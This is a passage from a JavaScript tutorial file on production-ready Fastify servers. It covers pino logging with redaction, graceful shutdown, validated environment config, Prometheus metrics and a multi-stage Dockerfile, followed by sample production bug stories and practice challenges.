//     transport: process.env.NODE_ENV === 'development'
//       ? { target: 'pino-pretty', options: { colorize: true, translateTime: 'SYS:standard' } }
//       : undefined,
//     // Structured JSON in production (default)
//     // Redact sensitive fields:
//     redact: {
//       paths: [
//         'req.headers.authorization',
//         'req.headers.cookie',
//         'body.password',
//         'body.passwordHash',
//         'body.cardNumber',
//         'body.cvv'
//       ],
//       censor: '[REDACTED]'
//     },
//     // Custom request serializer (don't log body by default):
//     serializers: {
//       req(req) {
//         return { method: req.method, url: req.url, id: req.id, userAgent: req.headers['user-agent'] };
//       }
//     }
//   },
//   genReqId: (req) => req.headers['x-request-id'] || crypto.randomUUID(), // Use upstream ID if provided
//   trustProxy: true
// });

// EXAMPLE 2: Request ID propagation and correlation

// Attach request ID to all logs in a request's scope:
// fastify.addHook('onRequest', async (request) => {
//   // request.id is auto-generated by Fastify (or from genReqId)
//   // Set response header so clients can correlate:
//   request.server.log.child({ reqId: request.id }); // Already done by pino automatically
// });
//
// fastify.addHook('onResponse', async (request, reply) => {
//   reply.header('X-Request-Id', request.id); // Echo back for client correlation
// });
//
// // In route handler — logs automatically include reqId:
// fastify.post('/orders', async (request) => {
//   request.log.info({ customerId: request.user.sub, itemCount: request.body.items.length },
//     'Processing order');
//
//   const order = await processOrder(request.body);
//
//   request.log.info({ orderId: order.id, totalAmount: order.total }, 'Order created');
//   return order;
// });

// EXAMPLE 3: Graceful shutdown with SIGTERM

// let isShuttingDown = false;
//
// async function startServer() {
//   await fastify.register(require('./plugins/config'));
//   await fastify.register(require('./plugins/database'));
//   await fastify.register(require('./plugins/auth'));
//   await fastify.register(require('./routes'));
//
//   process.on('SIGTERM', gracefulShutdown);
//   process.on('SIGINT', gracefulShutdown);
//
//   // Reject new requests during shutdown:
//   fastify.addHook('onRequest', async (request, reply) => {
//     if (isShuttingDown) {
//       reply.status(503)
//         .header('Connection', 'close')
//         .header('Retry-After', '30')
//         .send({ error: 'Server is shutting down, please retry' });
//     }
//   });
//
//   try {
//     const port = fastify.config.PORT || 3000;
//     await fastify.listen({ port, host: '0.0.0.0' });
//     fastify.log.info(\`Server listening on port \${port}\`);
//   } catch (err) {
//     fastify.log.fatal({ err }, 'Failed to start server');
//     process.exit(1);
//   }
// }
//
// async function gracefulShutdown() {
//   if (isShuttingDown) return; // Prevent double-shutdown
//   isShuttingDown = true;
//   fastify.log.info('Graceful shutdown initiated');
//
//   // Give in-flight requests 25s to complete (before Kubernetes SIGKILL at 30s):
//   const timeout = setTimeout(() => {
//     fastify.log.error('Graceful shutdown timeout — forcing exit');
//     process.exit(1);
//   }, 25000);
//
//   try {
//     await fastify.close(); // onClose hooks run: DB pool, Redis close
//     clearTimeout(timeout);
//     fastify.log.info('Graceful shutdown complete');
//     process.exit(0);
//   } catch (err) {
//     fastify.log.error({ err }, 'Error during shutdown');
//     process.exit(1);
//   }
// }
//
// startServer();

// EXAMPLE 4: @fastify/env for validated configuration

// // plugins/config.js
// const fp = require('fastify-plugin');
//
// const envSchema = {
//   type: 'object',
//   required: ['DATABASE_URL', 'JWT_SECRET'],
//   properties: {
//     NODE_ENV: { type: 'string', default: 'development' },
//     PORT: { type: 'integer', default: 3000 },
//     HOST: { type: 'string', default: '0.0.0.0' },
//     DATABASE_URL: { type: 'string' },
//     DATABASE_POOL_MAX: { type: 'integer', default: 10 },
//     JWT_SECRET: { type: 'string', minLength: 32 },
//     JWT_EXPIRY: { type: 'string', default: '15m' },
//     REDIS_URL: { type: 'string', default: 'redis://localhost:6379' },
//     LOG_LEVEL: { type: 'string', default: 'info' },
//     CORS_ORIGIN: { type: 'string', default: 'http://localhost:3001' },
//     RATE_LIMIT_MAX: { type: 'integer', default: 100 },
//     SENTRY_DSN: { type: 'string', default: '' }
//   }
// };
//
// module.exports = fp(async function configPlugin(fastify) {
//   await fastify.register(require('@fastify/env'), {
//     schema: envSchema,
//     dotenv: true  // Also reads .env file
//   });
//   fastify.log.info({ env: fastify.config.NODE_ENV }, 'Configuration loaded');
// }, { name: 'config' });

// EXAMPLE 5: Prometheus metrics

// fastify.register(require('@fastify/metrics'), {
//   endpoint: '/metrics',
//   defaultMetrics: { enabled: true },
//   routeMetrics: {
//     enabled: true,
//     registeredRoutesOnly: true, // Only track known routes (not 404s)
//     groupStatusCodes: false,
//   }
// });
//
// // Custom business metrics:
// // const client = require('prom-client');
// //
// // const orderRevenue = new client.Counter({
// //   name: 'order_revenue_total_inr',
// //   help: 'Total order revenue in INR paise',
// //   labelNames: ['payment_method', 'city']
// // });
// //
// // const activeUsers = new client.Gauge({
// //   name: 'active_users_count',
// //   help: 'Currently active users'
// // });
// //
// // const searchDuration = new client.Histogram({
// //   name: 'search_duration_seconds',
// //   help: 'Time taken for search queries',
// //   buckets: [0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1]
// // });
// //
// // // In checkout route:
// // orderRevenue.inc({ payment_method: 'upi', city: 'Mumbai' }, order.totalPaise);

// EXAMPLE 6: Dockerfile multi-stage build (as comment — not runnable JS)

/*
# Multi-stage Dockerfile for Fastify production:

# Stage 1: Builder
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci                        # Install ALL deps (including devDeps)
COPY . .
RUN npm run build                 # Compile TypeScript → dist/

# Stage 2: Production
FROM node:20-alpine AS production
WORKDIR /app

# Security: create non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

# Copy only what's needed:
COPY package*.json ./
RUN npm ci --only=production      # Only production deps (~3x smaller)
COPY --from=builder /app/dist ./dist

# Switch to non-root:
USER appuser

EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
  CMD wget -qO- http://localhost:3000/health || exit 1

CMD ["node", "dist/server.js"]
*/

// EXAMPLE 7: Node.js cluster mode for single-VM multi-core usage

// // cluster.js
// // const cluster = require('cluster');
// // const { cpus } = require('os');
// // const numCPUs = cpus().length;
// //
// // if (cluster.isPrimary) {
// //   console.log(\`Primary \${process.pid} is running\`);
// //   console.log(\`Forking \${numCPUs} workers...\`);
// //
// //   for (let i = 0; i < numCPUs; i++) {
// //     cluster.fork();
// //   }
// //
// //   cluster.on('exit', (worker, code, signal) => {
// //     console.log(\`Worker \${worker.process.pid} died (code: \${code}). Restarting...\`);
// //     cluster.fork(); // Auto-restart crashed workers
// //   });
// //
// //   // Graceful shutdown all workers:
// //   process.on('SIGTERM', () => {
// //     for (const id in cluster.workers) {
// //       cluster.workers[id].process.kill('SIGTERM');
// //     }
// //   });
// // } else {
// //   // Worker process — run the Fastify server:
// //   require('./server');
// //   console.log(\`Worker \${process.pid} started\`);
// // }
    `,
    bugs: `
REAL PRODUCTION BUGS FROM LOGGING, DEPLOYMENT, AND MONITORING:
--------------------------------------------------------------

BUG 1: PII in logs — GDPR/privacy violation
  Scenario: Developer logged request body for debugging:
    fastify.addHook('onRequest', async (request) => {
      fastify.log.info({ body: request.body }, 'Request received');
    });
    (Note: body isn't parsed yet in onRequest — but the pattern appeared in preHandler)
    preHandler logs included: { body: { email: 'priya@example.com', password: 'mysecret123', phone: '9876543210' } }
    Logs shipped to a third-party logging service. Passwords and personal data exposed.
    GDPR notification required. Regulatory fine.
  Root cause: Logging request body without redaction. Password in plain text in logs.
  Fix:
    Fastify({ logger: { redact: { paths: ['body.password', 'body.cardNumber', 'req.headers.authorization'], censor: '[REDACTED]' } } })
    Never log request.body by default. Explicitly log only safe fields.

BUG 2: Missing SIGTERM handler — dropped requests on Kubernetes rolling update
  Scenario: Kubernetes rolling update. Old pod receives SIGTERM.
    No handler: Node process exits immediately.
    In-flight requests: "ECONNRESET" errors on client side.
    5% of requests during deployment: failed. E-commerce during sale event.
    Users got "Network Error" at checkout.
  Root cause: No graceful shutdown. SIGTERM = instant death.
  Fix:
    process.on('SIGTERM', async () => {
      await fastify.close();
      process.exit(0);
    });
    Set Kubernetes terminationGracePeriodSeconds: 30 to give Node time to finish.
    Add preStop lifecycle hook in pod spec: sleep 5 (gives load balancer time to route away).

BUG 3: LOG_LEVEL='debug' in production — performance degradation + data exposure
  Scenario: Developer accidentally deployed with LOG_LEVEL=debug (copied from dev .env).
    Production: pino logging every request's parsed body, all trace-level internals.
    Log volume: 50GB/day instead of normal 500MB/day. CloudWatch costs: 100× over budget.
    Debug logs included: database query parameters with user IDs, internal state.
    Also: pino at debug level significantly impacts throughput (I/O bound).
  Root cause: LOG_LEVEL not validated or defaulted to safe value.
  Fix:
    @fastify/env schema: { LOG_LEVEL: { type: 'string', default: 'info', enum: ['info', 'warn', 'error'] } }
    Exclude 'debug' and 'trace' from allowed production values.
    Alert: if log volume spikes 10× → PagerDuty alert.

BUG 4: Health check endpoint behind auth — load balancer marks server unhealthy
  Scenario: fastify.addHook added global auth. All routes required JWT.
    Load balancer health check: GET /health (no token).
    Server: 401 Unauthorized.
    Load balancer: "Server unhealthy — removing from pool."
    All pods marked unhealthy. No traffic routed. Service down.
  Root cause: Health check endpoint must be publicly accessible.
  Fix:
    fastify.get('/health', { config: { public: true } }, async () => ({ status: 'ok' }));
    Global auth hook must check routeConfig.public:
    if (request.routeConfig?.public) return; // Skip auth
    OR: register health check BEFORE global auth hook, in its own scope.

BUG 5: process.env read inside request handler — config not validated at startup
  Scenario: Route handler read env var directly:
    fastify.post('/pay', async (request) => {
      const razorpayKey = process.env.RAZORPAY_KEY_ID; // Read per request
      if (!razorpayKey) throw new Error('Payment not configured');
    });
    RAZORPAY_KEY_ID not set in staging environment.
    Server started fine (no startup validation).
    First payment request on staging: 500 error, "Payment not configured."
    Staging env untested for 2 weeks before caught. Feature shipped to production almost untested.
  Root cause: process.env read at runtime, not validated at startup.
    Missing env var only discovered when a specific code path runs.
  Fix: @fastify/env validates ALL required env vars at startup:
    required: ['RAZORPAY_KEY_ID', 'RAZORPAY_KEY_SECRET']
    Server refuses to start if missing → immediate discovery. Cannot pass staging without correct config.
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE PRODUCTION BEHAVIOR:
  Given this server startup code:

  process.on('SIGTERM', async () => {
    console.log('SIGTERM received');
    await fastify.close();
    process.exit(0);
  });

  fastify.addHook('onRequest', async (request, reply) => {
    if (isShuttingDown) reply.status(503).send({ error: 'Shutting down' });
  });

  // isShuttingDown is set to true in the SIGTERM handler (before fastify.close())

  For each scenario, predict what happens:
  a) SIGTERM received. 10 requests currently being processed. What happens to them?
  b) New request arrives 100ms after SIGTERM. What response does it get?
  c) fastify.close() is called. The DB pool has 3 active queries. What happens?
     (Assuming onClose hook calls pool.end())
  d) fastify.close() takes 35 seconds but Kubernetes terminationGracePeriodSeconds is 30.
     What happens at second 30? What should you do to prevent this?
  e) A worker in cluster mode crashes. No cluster.on('exit') handler. What happens?

CHALLENGE 2 — FIX THE PRODUCTION BUGS:
  This production server config has 3 bugs. Find and fix each.

  // Bug 1: LOG_LEVEL not defaulted safely
  const fastify = Fastify({
    logger: { level: process.env.LOG_LEVEL } // undefined if not set!
  });

  // Bug 2: PII in logs
  fastify.addHook('preHandler', async (request) => {
    fastify.log.info({ requestBody: request.body }, 'Handler starting');
    // request.body may contain passwords, card numbers, etc.
  });

  // Bug 3: Health check not public
  fastify.addHook('onRequest', async (request, reply) => {
    await request.jwtVerify(); // Global auth — no skip for /health
  });
  fastify.get('/health', async () => ({ status: 'ok' }));
  // Kubernetes probe: GET /health → 401 → pod marked unhealthy!

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a production-ready Fastify server configuration for a high-traffic SaaS API.

  Requirements:
  1. Pino logger:
     - JSON in production, pretty-print in development
     - Redact: authorization header, password, cardNumber, aadhaarNumber
     - Custom serializer for req: only log method, url, reqId, userId (from JWT if present)
     - Log level from @fastify/env config

  2. @fastify/env configuration:
     - Required: DATABASE_URL, JWT_SECRET (min 32 chars), REDIS_URL
     - Optional with defaults: PORT (3000), LOG_LEVEL ('info'), NODE_ENV ('development'),
       MAX_POOL_SIZE (10), RATE_LIMIT_MAX (100)
     - Decorated as fastify.config

  3. Prometheus metrics:
     - HTTP request count and duration (built-in via @fastify/metrics)
     - Custom counter: order_created_total with labels: { payment_method, city }
     - Custom histogram: db_query_duration_seconds
     - /metrics endpoint accessible without auth

  4. Graceful shutdown:
     - SIGTERM + SIGINT handlers
     - isShuttingDown flag → 503 for new requests
     - 25-second timeout before force exit
     - onClose hooks for DB pool, Redis, flush metrics

  5. Health check endpoints:
     - GET /health → basic liveness (always returns 200 if server is up)
     - GET /health/ready → readiness (checks DB connectivity, Redis ping)
     - Both: public (no auth), not tracked by Prometheus

  6. Dockerfile: multi-stage, non-root user, health check using wget

  Show: complete server.js, plugins/config.js, plugins/metrics.js, Dockerfile
    `,
    summary: `Production Fastify requires five non-negotiable practices: structured pino logging with PII redaction for observable, searchable logs; @fastify/env for config validation that fails at startup rather than runtime; graceful SIGTERM handling so in-flight requests complete before the process exits; Prometheus metrics for real-time performance visibility; and a multi-stage Docker build with a non-root user for a small, secure deployment image. Get these right once and your infrastructure becomes self-documenting, self-healing, and safe to deploy dozens of times per day.`
  }
];
